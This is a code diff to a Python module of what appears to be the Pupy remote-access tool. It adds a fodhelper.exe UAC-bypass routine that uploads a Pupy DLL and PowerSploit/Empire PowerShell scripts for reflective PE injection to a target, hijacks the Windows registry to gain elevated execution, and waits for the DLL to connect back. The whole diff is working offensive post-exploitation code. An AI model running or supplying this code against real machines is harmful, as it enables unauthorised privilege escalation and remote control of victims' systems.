@@ -39,6 +39,26 @@ class bypassuac():
         self.invokeReflectivePEInjectionLocalPath = os.path.join(rootPupyPath,"pupy", "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1")
         self.invokeBypassUACLocalPath = os.path.join(rootPupyPath, "pupy", "external", "Empire", "privesc", "Invoke-BypassUAC.ps1")
 
+    def bypassuac_through_fodhelper(self):
+        '''
+        Performs an UAC bypass attack by using fodhepler.exe (wind10 only): Thanks to https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1
+        '''
+        self.module.info("Running 'fodhelper' method for bypassing UAC...")
+        if '64' in self.module.client.desc['os_arch']:
+            force_x86_dll = False
+        else:
+            force_x86_dll = True
+        self.module.info('Uploading temporary files')
+        self.uploadPupyDLL(force_x86_dll=force_x86_dll)
+        self.uploadPowershellScripts()
+        files_to_delete=[self.invokeReflectivePEInjectionRemotePath, self.mainPowershellScriptRemotePath, self.pupyDLLRemotePath]
+        self.module.info('Altering the registry')
+        self.module.client.conn.modules["pupwinutils.bypassuac_remote"].registry_hijacking_fodhelper(self.mainPowershellScriptRemotePath, files_to_delete)
+
+        self.module.success("Waiting for a connection from the DLL (take few seconds, 1 min max)...")
+        self.module.success("If nothing happened, try to migrate to another process and try again.")
+
+    """
     def bypassuac_through_appPaths(self):
         '''
         Performs an UAC bypass attack by using app Paths + sdclt.exe (Wind10 Only): Thanks to enigma0x3 (https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/).
@@ -57,7 +77,7 @@ class bypassuac():
 
         self.module.success("Waiting for a connection from the DLL (take few seconds, 1 min max)...")
         self.module.success("If nothing happened, try to migrate to another process and try again.")
-
+    """
 
     def bypassuac_through_eventVwrBypass(self):
         #   '''
@@ -177,3 +197,4 @@ class bypassuac():
 
         logging.info("Uploading pupy dll {0} to {1}".format(self.pupyDLLLocalPath, self.pupyDLLRemotePath))
         upload(self.module.client.conn, self.pupyDLLLocalPath, self.pupyDLLRemotePath)
+        
